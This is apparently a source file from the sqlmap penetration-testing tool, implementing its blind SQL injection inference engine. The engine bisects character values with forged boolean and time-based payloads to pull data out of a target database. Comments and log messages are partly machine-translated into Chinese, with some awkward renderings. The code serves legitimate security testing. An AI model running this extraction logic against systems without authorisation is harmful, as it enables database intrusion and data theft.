#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import division

import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import getPartRun
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import goGoodSamaritan
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import isDigit
from lib.core.common import isListLike
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import MAX_BISECTION_LENGTH
from lib.core.settings import MAX_REVALIDATION_STEPS
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_HEX_VALUE_MARKER
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.safe2bin import safecharencode
from lib.utils.xrange import xrange
from thirdparty import six

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    abortedFlag = False
    showEta = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0

    if payload is None:
        return 0, None

    if charsetType is None and conf.charset:
        asciiTbl = sorted(set(ord(_) for _ in conf.charset))
    else:
        asciiTbl = getCharset(charsetType)

    threadData = getCurrentThreadData()
    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:
            pass
        elif PARTIAL_HEX_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")

            if retVal and conf.hexConvert:
                partialValue = retVal
                infoMsg = '恢复部分值：%s' % safecharencode(partialValue)
                logger.info(infoMsg)
        elif PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal and not conf.hexConvert:
                partialValue = retVal
                infoMsg = '恢复部分值：%s' % safecharencode(partialValue)
                logger.info(infoMsg)
        else:
            infoMsg = "resumed: %s" % safecharencode(retVal)
            logger.info(infoMsg)

            return 0, retVal

    if Backend.isDbms(DBMS.MCKOI):
        match = re.search(r"\ASELECT\b(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            original = queries[Backend.getIdentifiedDbms()].inference.query
            right = original.split('<')[1]
            payload = payload.replace(right, "(SELECT %s FROM %s)" % (right, match.group(2).strip()))
            expression = match.group(1).strip()

    elif Backend.isDbms(DBMS.FRONTBASE):
        match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
            payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
            expression = match.group(2).strip()

    try:
        # 设置 kb.partRun，以防使用“通用预测”功能（又名“好撒玛利亚人”）或从 API 调用引擎
        if conf.predictOutput:
            kb.partRun = getPartRun()
        elif conf.api:
            kb.partRun = getPartRun(alias=False)
        else:
            kb.partRun = None

        if partialValue:
            firstChar = len(partialValue)
        elif re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            firstChar = 0
        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
            firstChar = int(conf.firstChar) - 1
            if kb.fileReadMode:
                firstChar <<= 1
        elif hasattr(firstChar, "isdigit") and firstChar.isdigit() or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1
        else:
            firstChar = 0

        if re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            lastChar = 0
        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
            lastChar = int(conf.lastChar)
        elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
            lastChar = int(lastChar)
        else:
            lastChar = 0

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):
            length = int(length)
        else:
            length = None

        if length == 0:
            return 0, ""

        if length and (lastChar > 0 or firstChar > 0):
            length = min(length, lastChar or length) - firstChar

        if length and length > MAX_BISECTION_LENGTH:
            length = None

        showEta = conf.eta and isinstance(length, int)

        if kb.bruteMode:
            numThreads = 1
        else:
            numThreads = min(conf.threads or 0, length or 0) or 1

        if showEta:
            progress = ProgressBar(maxValue=length)

        if numThreads > 1:
            if not timeBasedCompare or kb.forceThreads:
                debugMsg = '起始 %d 螺纹%s' % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not any((timeBasedCompare, conf.predictOutput)):
            warnMsg = '以单线程模式运行。请考虑 '
            warnMsg += '使用选项“--threads”以加快数据检索速度'
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            if isinstance(length, int) and numThreads > 1:
                dataToStdout('[%s] [信息] 检索到：%s' % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout('\r[%s] [信息] 检索到： ' % time.strftime("%X"))
            else:
                dataToStdout('\r[%s] [信息] 检索到： ' % time.strftime("%X"))

        def tryHint(idx):
            with kb.locks.hint:
                hintValue = kb.hintValue

            if payload is not None and len(hintValue or "") > 0 and len(hintValue) >= idx:
                if "'%s'" % CHAR_INFERENCE_MARK in payload:
                    posValue = hintValue[idx - 1]
                else:
                    posValue = ord(hintValue[idx - 1])

                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                forgedPayload = agent.extractPayload(payload) or ""
                forgedPayload = forgedPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return hintValue[idx - 1]

            with kb.locks.hint:
                kb.hintValue = ""

            return None

        def validateChar(idx, value):
            """
            Used in inference - in time-based SQLi if original and retrieved value are not equal there will be a deliberate delay
            """

            threadData = getCurrentThreadData()

            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
            else:
                # e.g.: ... > '%c' -> ... > ORD(..)
                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(value))
                forgedPayload = validationPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))

            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

            if result and timeBasedCompare and getTechniqueData().trueCode:
                result = threadData.lastCode == getTechniqueData().trueCode
                if not result:
                    warnMsg = '在验证阶段检测到的 HTTP 代码“%s”与预期的“%s”不同' % (threadData.lastCode, getTechniqueData().trueCode)
                    singleTimeWarnMessage(warnMsg)

            incrementCounter(getTechnique())

            return result

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
            """
            continuousOrder means that distance between each two neighbour's
            numerical values is exactly 1
            """

            threadData = getCurrentThreadData()

            result = tryHint(idx)

            if result:
                return result

            if charTbl is None:
                charTbl = type(asciiTbl)(asciiTbl)

            originalTbl = type(charTbl)(charTbl)

            if kb.disableShiftTable:
                shiftTable = None
            elif continuousOrder and shiftTable is None:
                # 用于逐渐扩展到 unicode 字符空间
                shiftTable = [2, 2, 3, 3, 3]

            if "'%s'" % CHAR_INFERENCE_MARK in payload:
                for char in ('\n', '\r'):
                    if ord(char) in charTbl:
                        if not isinstance(charTbl, list):
                            charTbl = list(charTbl)
                        charTbl.remove(ord(char))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minValue = charTbl[0]
            firstCheck = False
            lastCheck = False
            unexpectedCode = False

            if continuousOrder:
                while len(charTbl) > 1:
                    position = None

                    if charsetType is None:
                        if not firstCheck:
                            try:
                                try:
                                    lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                                except IndexError:
                                    lastChar = None
                                else:
                                    if 'a' <= lastChar <= 'z':
                                        position = charTbl.index(ord('a') - 1)  # 96
                                    elif 'A' <= lastChar <= 'Z':
                                        position = charTbl.index(ord('A') - 1)  # 64
                                    elif '0' <= lastChar <= '9':
                                        position = charTbl.index(ord('0') - 1)  # 47
                            except ValueError:
                                pass
                            finally:
                                firstCheck = True

                        elif not lastCheck and numThreads == 1:  # 不能在多线程环境下使用
                            if charTbl[(len(charTbl) >> 1)] < ord(' '):
                                try:
                                    # 如果当前值倾向于 0，则优先检查最后一个字符
                                    position = charTbl.index(1)
                                except ValueError:
                                    pass
                                finally:
                                    lastCheck = True

                    if position is None:
                        position = (len(charTbl) >> 1)

                    posValue = charTbl[position]
                    falsePayload = None

                    if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
                    else:
                        # e.g.: ... > '%c' -> ... > ORD(..)
                        markingValue = "'%s'" % CHAR_INFERENCE_MARK
                        unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                        forgedPayload = payload.replace(markingValue, unescapedCharValue)
                        forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)

                    if timeBasedCompare:
                        if kb.responseTimeMode:
                            kb.responseTimePayload = falsePayload
                        else:
                            kb.responseTimePayload = None

                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

                    incrementCounter(getTechnique())

                    if not timeBasedCompare and getTechniqueData() is not None:
                        unexpectedCode |= threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)
                        if unexpectedCode:
                            if threadData.lastCode is not None:
                                warnMsg = '检测到意外的 HTTP 代码“%s”。' % threadData.lastCode
                            else:
                                warnMsg = '检测到意外响应。'

                            warnMsg += ' 在类似情况下将使用（额外）验证步骤'

                            singleTimeWarnMessage(warnMsg)

                    if result:
                        minValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[position:]
                        else:
                            # xrange() - 用于内存/空间优化的扩展虚拟字符集
                            charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                    else:
                        maxValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[:position]
                        else:
                            charTbl = xrange(charTbl[0], charTbl[position])

                    if len(charTbl) == 1:
                        if maxValue == 1:
                            return None

                        # 超越原始字符集
                        elif minValue == maxChar:
                            # 如果原来的 charTbl 是 [0,...,127] 新的
                            # 将是 [128,..,(128 << 4) - 1] 或从 128 到 2047
                            # 而不是列出一个包含所有内容的巨大列表
                            # 我们使用 xrange 的元素，它是一个虚拟的
                            # list
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = xrange(charTbl)
                                maxChar = maxValue = charTbl[-1]
                                minValue = charTbl[0]
                            else:
                                kb.disableShiftTable = True
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if (timeBasedCompare or unexpectedCode) and not validateChar(idx, retVal):
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    threadData.validationRun = 0
                                    if (retried or 0) < MAX_REVALIDATION_STEPS:
                                        errMsg = '检测到无效字符。重试..'
                                        logger.error(errMsg)

                                        if timeBasedCompare:
                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:
                                                conf.timeSec += 1
                                                warnMsg = '将时间延迟增加到 %d 秒 %s' % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                                logger.warning(warnMsg)

                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                                dbgMsg = '关闭时间自动调整机制'
                                                logger.debug(dbgMsg)
                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)
                                    else:
                                        errMsg = "无法正确验证最后一个字符值（'%s'）。" % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        threadData.validationRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = '准时返回自动调整机制'
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
            else:
                if "'%s'" % CHAR_INFERENCE_MARK in payload and conf.charset:
                    errMsg = '“%s”不支持选项“--charset”' % Backend.getIdentifiedDbms()
                    raise SqlmapUnsupportedFeatureException(errMsg)

                candidates = list(originalTbl)
                bit = 0
                while len(candidates) > 1:
                    bits = {}
                    for candidate in candidates:
                        bit = 0
                        while candidate:
                            bits.setdefault(bit, 0)
                            bits[bit] += 1 if candidate & 1 else -1
                            candidate >>= 1
                            bit += 1

                    choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]
                    mask = 1 << choice

                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        candidates = [_ for _ in candidates if _ & mask > 0]
                    else:
                        candidates = [_ for _ in candidates if _ & mask == 0]

                    bit += 1

                if candidates:
                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        return decodeIntToUnicode(candidates[0])

        # 进行多线程 (--threads > 1)
        if numThreads > 1 and isinstance(length, int) and length > 1:
            threadData.shared.value = [None] * length
            threadData.shared.index = [firstChar]    # 作为 python 嵌套函数作用域的列表
            threadData.shared.start = firstChar

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.index:
                            if threadData.shared.index[0] - firstChar >= length:
                                return

                            threadData.shared.index[0] += 1
                            currentCharIndex = threadData.shared.index[0]

                        if kb.threadContinue:
                            val = getChar(currentCharIndex, asciiTbl, not (charsetType is None and conf.charset))
                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        # 注：https://github.com/sqlmapproject/sqlmap/issues/4629
                        if not isListLike(threadData.shared.value):
                            break

                        with kb.locks.value:
                            threadData.shared.value[currentCharIndex - 1 - firstChar] = val
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                progress.progress(threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = 0

                                for i in xrange(length):
                                    if currentValue[i] is not None:
                                        endCharIndex = max(endCharIndex, i)

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')

                                for i in xrange(length):
                                    count += 1 if currentValue[i] is not None else 0

                                if startCharIndex > 0:
                                    output = ".." + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                    output = output[:-2] + ".."

                                if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
                                    _ = count - firstChar
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))
                                    output += status if _ != length else " " * len(status)

                                    dataToStdout('\r[%s] [信息] 检索到：%s' % (time.strftime("%X"), output))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = [_ for _ in partialValue]
                value.extend(_ for _ in threadData.shared.value)

            infoMsg = None

            # 如果我们有一个字符没有正确获取
            # 可能意味着与目标 URL 的连接已丢失
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = '\r[%s] [INFO] 部分检索：%s' % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = '\r[%s] [信息] 检索到：%s' % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and infoMsg and not any((showEta, conf.api, kb.bruteMode)):
                dataToStdout(infoMsg)

        # 无多线程（--threads = 1）
        else:
            index = firstChar
            threadData.shared.value = ""

            while True:
                index += 1

                # 通用预测功能（又名“好撒玛利亚人”）
                # 注意：仅在未设置多线程时使用
                # 那一刻
                if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

                    # 如果公共输出中只有一个输出，请检查
                    # 它通过等于查询输出
                    if commonValue is not None:
                        # 包含 equals commonValue 的一次性查询
                        testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # 我们有运气吗？
                        if result:
                            if showEta:
                                progress.progress(len(commonValue))
                            elif conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(commonValue[index - 1:]))

                            finalValue = commonValue
                            break

                    # 如果存在以partialValue开头的通用模式，
                    # 通过 equal 对照子字符串查询输出进行检查
                    if commonPattern is not None:
                        # 包含等于 commonPattern 的子字符串查询
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)=%s" % (subquery, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # 我们有运气吗？
                        if result:
                            val = commonPattern[index - 1:]
                            index += len(val) - 1

                    # 否则，如果没有 commonValue（来自
                    # txt/common-outputs.txt）并且没有 commonPattern
                    # （通用模式）仅使用返回的通用字符集
                    # 检索查询输出
                    if not val and commonCharset:
                        val = getChar(index, commonCharset, False)

                    # 如果我们没有 commonValue 和通用字符集，
                    # 使用返回的其他字符集
                    if not val:
                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                else:
                    val = getChar(index, asciiTbl, not (charsetType is None and conf.charset))

                if val is None:
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                threadData.shared.value = partialValue = partialValue + val

                if showEta:
                    progress.progress(index)
                elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
                    dataToStdout(filterControlChars(val))

                # 注意：某些 DBMS（例如 Firebird、DB2 等）存在尾随空格问题
                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                    break
                elif charsetType and partialValue[-1:].isspace():
                    finalValue = partialValue[:-1]
                    break

                if (lastChar > 0 and index >= lastChar):
                    finalValue = "" if length == 0 else partialValue
                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue
                    partialValue = None
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
            hashDBWrite(expression, finalValue)
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))

    if conf.hexConvert and not any((abortedFlag, conf.api, kb.bruteMode)):
        infoMsg = '\r[%s] [信息] 检索到：%s %s\n' % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            dataToStdout("\n")

        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException('线程内发生了意外的事情')

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue

    return getCounter(getTechnique()), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    infoMsg = '检索查询输出的长度'
    logger.info(infoMsg)

    start = time.time()

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = '执行了 %d%s查询，用时 %.2f 秒' % (count, " 次", calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if isinstance(length, six.string_types) and length.isspace():
        length = 0

    return length
